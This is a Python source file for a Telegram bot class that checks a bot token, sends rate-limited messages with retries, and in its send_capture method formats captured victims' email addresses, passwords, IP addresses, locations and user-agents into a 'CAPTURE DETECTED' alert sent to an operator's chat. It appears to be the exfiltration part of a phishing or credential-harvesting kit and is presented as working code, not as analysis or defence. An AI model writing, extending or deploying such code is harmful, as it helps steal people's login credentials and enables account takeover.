import requests
import time
from datetime import datetime

class TelegramBot:
    def __init__(self, token=None, chat_id=None):
        self.token = token
        self.chat_id = chat_id
        self.status = 'not_configured'
        self.last_error = None
        self.last_response = None
        self._last_send_time = 0
        self._min_interval = 1
    
    def configure(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.status = 'testing'
        self.last_error = None
        return self.test()
    
    def test(self):
        if not self.token or not self.chat_id:
            self.status = 'not_configured'
            return False
        try:
            url = f'https://api.telegram.org/bot{self.token}/getMe'
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                result = response.json()
                if result.get('ok'):
                    self.status = 'connected'
                    self.send_message('🤖 *Bot is connected and ready!*')
                    return True
                else:
                    self.status = 'invalid_token'
                    self.last_error = result.get('description', 'Invalid token')
                    return False
            else:
                self.status = 'invalid_token'
                self.last_error = f'HTTP {response.status_code}'
                return False
        except Exception as e:
            self.status = 'error'
            self.last_error = str(e)
            return False
    
    def send_message(self, message, parse_mode='Markdown', retry=2):
        if not self.token or not self.chat_id:
            self.status = 'not_configured'
            return False
        
        now = time.time()
        time_since_last = now - self._last_send_time
        if time_since_last < self._min_interval:
            time.sleep(self._min_interval - time_since_last)
        
        chat_id_clean = self.chat_id.strip()
        
        for attempt in range(retry + 1):
            try:
                url = f'https://api.telegram.org/bot{self.token}/sendMessage'
                payload = {
                    'chat_id': chat_id_clean,
                    'text': message,
                    'parse_mode': parse_mode,
                    'disable_web_page_preview': True
                }
                response = requests.post(url, json=payload, timeout=15)
                result = response.json()
                self.last_response = result
                self._last_send_time = time.time()
                
                if result.get('ok'):
                    self.status = 'connected'
                    self.last_error = None
                    return True
                else:
                    error_desc = result.get('description', 'Unknown error')
                    self.last_error = error_desc
                    if 'Too Many Requests' in error_desc or '429' in error_desc:
                        time.sleep(2 ** attempt)
                        continue
                    if 'can\'t parse entities' in error_desc and parse_mode is not None:
                        if attempt < retry:
                            time.sleep(1)
                            continue
                        return self.send_message(message, parse_mode=None, retry=0)
                    return False
            except Exception as e:
                self.last_error = str(e)
                if attempt < retry:
                    time.sleep(1)
                    continue
                return False
        return False
    
    def send_capture(self, data):
        if not self.token or not self.chat_id:
            return False
        msg = f"""🚨 **CAPTURE DETECTED** 🚨

📋 **Type:** {data.get('type', 'Unknown')}
📧 **Email:** `{data.get('email', 'N/A')}`
🔑 **Password:** `{data.get('password', 'N/A')}`
🌐 **IP:** `{data.get('ip', 'N/A')}`
📍 **Location:** {data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}
🕐 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🔍 **User-Agent:** `{data.get('user_agent', 'N/A')[:60]}`"""
        return self.send_message(msg)
    
    def get_status(self):
        return {
            'status': self.status,
            'configured': bool(self.token and self.chat_id),
            'last_error': self.last_error,
            'token_preview': self.token[:10] + '...' if self.token else 'None'
        }